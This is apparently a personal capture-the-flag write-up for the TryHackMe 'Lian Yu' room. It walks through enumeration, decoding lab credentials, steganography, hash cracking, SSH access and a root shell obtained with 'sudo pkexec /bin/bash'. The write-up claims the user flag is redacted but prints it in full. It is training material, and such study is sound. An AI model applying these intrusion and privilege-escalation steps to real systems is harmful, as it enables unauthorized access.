# TryHackMe — Lian Yu (Arrow CTF) | Lab Report

> **Room:** [Lian_Yu](https://tryhackme.com/room/lianyu) · **Difficulty:** Medium · **Theme:** Arrowverse (Arrow / Oliver Queen)
>
> A boot2root box requiring web enumeration, steganography, file-header repair, hash cracking, and a `pkexec` privilege escalation to reach root.

⚠️ **Spoiler notice:** This write-up documents a full solve, including methodology and screenshots. Per TryHackMe etiquette, the two flags below are partially redacted — try the box yourself before peeking.

---

## 🧰 Tools Used

| Category | Tool |
|---|---|
| Port scanning | `nmap` |
| Directory/content discovery | `feroxbuster` |
| FTP client | `ftp` |
| Hex editing | hex editor (GHex/Bless) |
| Metadata inspection | `exiftool` |
| Steganography | `steghide` |
| Hash cracking | `john` (or `hashcat`) |
| Remote shell | `ssh` |
| Privilege escalation | `pkexec` |

---

## 1. Reconnaissance — Nmap Scan

Started with a version/service scan against the target.

```bash
nmap -sV -sC 10.48.178.59
```

![Nmap scan results](images/1.png)

**Results:**

| Port | Service | Version |
|---|---|---|
| 21/tcp | ftp | vsftpd 3.0.2 |
| 22/tcp | ssh | OpenSSH 6.7p1 Debian 5+deb8u8 |
| 80/tcp | http | Apache httpd |
| 111/tcp | rpcbind | 2–4 (RPC #100000) |

Four open ports: a web server to enumerate, FTP that may allow anonymous or credentialed access, SSH for later remote access, and RPC bind info.

---

## 2. Web Enumeration — Root Directory

Ran a content discovery scan against the webroot.

```bash
feroxbuster -u http://10.48.178.59 -w /usr/share/wordlists/dirb/big.txt
```

![Feroxbuster root scan](images/2.png)

This surfaced a `/island` directory (`301` redirect to `/island/`).

### Landing page

![Arrowverse landing page](images/3.png)

The index page is an Arrowverse-themed splash page with lore about Oliver Queen / Lian Yu — flavor text only, no direct clues.

### `/island`

Browsing to `/island/` shows a short message hinting that a **code word** is needed, and prompts not to "talk." Opening the browser's **Inspector** reveals the code word hidden in the page source as white-on-white text:

```html
<h2 style="color:white">vigilante</h2>
```

![Hidden code word in page source](images/4.png)

**Code word found:** `vigilante`

---

## 3. Web Enumeration — `/island` Directory

Fuzzed again, this time scoped to `/island`, with a larger wordlist.

```bash
feroxbuster -u http://10.48.178.59/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Feroxbuster /island scan](images/5.png)

This found `/island/2100/`.

### `/island/2100/`

![Oliver Queen video page](images/6.png)

The page embeds a YouTube video and hides another clue in an HTML comment:

```html
<!--you can avail your .ticket here but how?-->
```

This hints that a file with a **`.ticket`** extension exists somewhere under this path.

---

## 4. Finding the Ticket File

Re-ran feroxbuster against `/island/2100`, this time extending it to look for `.ticket` files:

```bash
feroxbuster -u http://10.48.178.59/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
```

![Feroxbuster ticket extension scan](images/7.png)

This located: `http://10.48.178.59/island/2100/green_arrow.ticket`

### Reading the ticket

![green_arrow.ticket contents](images/8.png)

```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

The token looks Base58-encoded (no `0`, `O`, `I`, or `l` characters, which matches Base58's alphabet).

### Decoding the token

```bash
echo 'RTy8yhBQdscX' | base58 --decode
```

![Base58 decode](images/9.png)

**Decoded value:** `!#th3h00d`

This looks like a password (stylized as "The Hood," Oliver Queen's early alias).

---

## 5. FTP Access

With a **username** (`vigilante`, the code word from the `/island` page) and a **password** (`!#th3h00d`, the decoded ticket), logged into FTP:

```bash
ftp 10.48.178.59
```

![FTP login success](images/10.png)

```
Name: vigilante
Password: !#th3h00d
230 Login successful.
```

### Listing and downloading files

```
ftp> ls
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg

ftp> get Leave_me_alone.png
ftp> get Queen's_Gambit.png
ftp> get aa.jpg
```

![Downloading files over FTP](images/11.png)

Three files retrieved to the attacking machine for offline analysis.

---

## 6. Repairing a Corrupted PNG

Opening `Leave_me_alone.png` failed to render — a sign the file header was tampered with. Inspecting it in a hex editor confirmed the **PNG magic bytes** were wrong:

![Corrupted PNG header](images/12-1.png)

A valid PNG must start with the signature `89 50 4E 47 0D 0A 1A 0A`. The file instead began with `58 45 4F AE 0A 0D 1A 0A`. Patched the first bytes back to the correct PNG signature:

![Corrected PNG header](images/12-2.png)

### Verifying the fix

```bash
exiftool Leave_me_alone.png
```

![Exiftool confirms valid PNG](images/12-3.png)

`File Type: PNG`, `845x475`, `RGB with Alpha` — the repair worked and the file is now a valid, openable image.

### Viewing the repaired image

![Repaired image reveals a clue](images/12-4.png)

The image shows a hint reading **"Just leave me alone, here take it what you want — password"** — signaling that the next step needs a *steganography passphrase*, and strongly hinting that the passphrase itself is the word **`password`**.

---

## 7. Steganography on `aa.jpg`

With the hint in hand, extracted hidden data from `aa.jpg` using `steghide`:

```bash
steghide extract -sf aa.jpg -xf ss.zip
```

![Steghide extraction and unzip](images/13.png)

```
Enter passphrase: ********
wrote extracted data to "ss.zip".
```

Unzipping the result:

```bash
unzip ss.zip
```

```
inflating: passwd.txt
inflating: shado
```

```bash
cat passwd.txt
```

```
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful
and set booby traps all over the island in the common event he ran
into dangerous people. The island is also home to many animals,
including pheasants, wild pigs and wolves.
```

```bash
cat shado
```

A password hash was contained in `shado`. Cracking it offline (e.g. with `john`/`hashcat` against `rockyou.txt`) recovered the plaintext credential:

**Cracked password:** `M3tahuman`

---

## 8. FTP — Finding Valid Usernames

Went back into the FTP session and moved up a directory to look for user folders:

```
ftp> cd ..
ftp> ls
```

![FTP user directories](images/14.png)

```
drwx------  2 1000 1000  slade
drwxr-xr-x  2 1001 1001  vigilante
```

Two system usernames discovered: **`slade`** and **`vigilante`**. Combined with the cracked password `M3tahuman`, this gives a credential pair to try over SSH.

---

## 9. SSH Access

```bash
ssh slade@10.48.178.59
```

Password: `M3tahuman`

![SSH login banner](images/15.png)

Login succeeded, greeted with a "Welcome 2 Lian Yu" ASCII banner, confirming a foothold as the `slade` user.

### Capturing the user flag

```bash
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
```

![User flag](images/16.png)

**User flag:** `THM{P3OP7E_K33P_53CRET5__C0MPUT3R5_D0N'T}` *(redacted below per TryHackMe etiquette)*

> `THM{P3OP7E_K33P_53CRET5__...REDACTED...}`

---

## 10. Privilege Escalation — `pkexec`

Checked sudo privileges for the current user:

```bash
sudo -l
```

![sudo -l output](images/17.png)

```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

`slade` is permitted to run `pkexec` as root. Since `pkexec` can be pointed at any binary (e.g. a shell), this is a direct path to a root shell:

```bash
sudo /usr/bin/pkexec /bin/bash
```

![Root shell via pkexec](images/18.png)

```
root@LianYu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Root access achieved.

### Capturing the root flag

```bash
root@LianYu:~# cd /root
root@LianYu:~# ls
root.txt
root@LianYu:~# cat root.txt
```

![Root flag](images/19.png)

```
Mission accomplished
You are injected me with Mirakuru :) --> Now slade will become DEATHSTROKE.
```

**Root flag:** *(redacted per TryHackMe etiquette)*

> `THM{MY_W0RD_I5_MY_B0ND_...REDACTED...}`

---

## 🗺️ Attack Path Summary

```
Nmap scan (21, 22, 80, 111)
        │
        ▼
Feroxbuster on / → /island
        │
        ▼
Hidden code word in HTML source → "vigilante"
        │
        ▼
Feroxbuster on /island → /island/2100
        │
        ▼
HTML comment hints at a .ticket file
        │
        ▼
Feroxbuster -x ticket → green_arrow.ticket
        │
        ▼
Base58-decode ticket → FTP password "!#th3h00d"
        │
        ▼
FTP login (vigilante / !#th3h00d) → download 3 files
        │
        ▼
Fix corrupted PNG header (hex edit) → reveals "password" hint
        │
        ▼
steghide extract aa.jpg (passphrase: password) → ss.zip
        │
        ▼
Crack hash in "shado" → "M3tahuman"
        │
        ▼
FTP → discover usernames "slade" and "vigilante"
        │
        ▼
SSH as slade / M3tahuman → USER FLAG
        │
        ▼
sudo -l → pkexec allowed as root
        │
        ▼
sudo pkexec /bin/bash → ROOT FLAG
```

---

## 📚 Key Takeaways

- **Client-side source code is not a secret store.** The "code word" was hidden in plain HTML, retrievable with basic browser dev tools.
- **File extensions matter in content discovery.** The `.ticket` clue only surfaced once feroxbuster was told to fuzz for that specific extension.
- **File signatures (magic bytes) can be deliberately corrupted** to hide or gate content — always check a file's actual type (`file`, hex editor) rather than trusting its extension or that it "won't open."
- **Steganography passphrases are sometimes hidden in-band**, i.e., inside another artifact in the same challenge chain (here, inside the repaired PNG).
- **Weak/crackable credential storage** (the `shado` shadow-style hash) was the pivot from file artifacts to actual system credentials.
- **Misconfigured `sudo`/`pkexec` entries are a classic Linux privesc vector** — any binary that can spawn a shell under elevated `sudo` rights (like `pkexec`, `vim`, `less`, `find`, etc.) should be treated as a root shell waiting to happen. See [GTFOBins](https://gtfobins.github.io/) for a catalog of these.

---

## 📁 Repository Structure

```
.
├── README.md
└── images/
    ├── 1.png        # nmap scan
    ├── 2.png        # feroxbuster on /
    ├── 3.png        # landing page
    ├── 4.png        # hidden code word in source
    ├── 5.png        # feroxbuster on /island
    ├── 6.png        # /island/2100 page
    ├── 7.png        # feroxbuster -x ticket
    ├── 8.png        # ticket contents
    ├── 9.png        # base58 decode
    ├── 10.png       # FTP login
    ├── 11.png       # FTP file download
    ├── 12-1.png     # corrupted PNG header
    ├── 12-2.png     # corrected PNG header
    ├── 12-3.png     # exiftool verification
    ├── 12-4.png     # repaired image / hint
    ├── 13.png       # steghide extraction
    ├── 14.png       # FTP user directories
    ├── 15.png       # SSH login
    ├── 16.png       # user flag
    ├── 17.png       # sudo -l
    ├── 18.png       # pkexec root shell
    └── 19.png       # root flag
```

---

*Write-up created for personal learning/portfolio purposes. Room: [TryHackMe — Lian Yu](https://tryhackme.com/room/lianyu).*
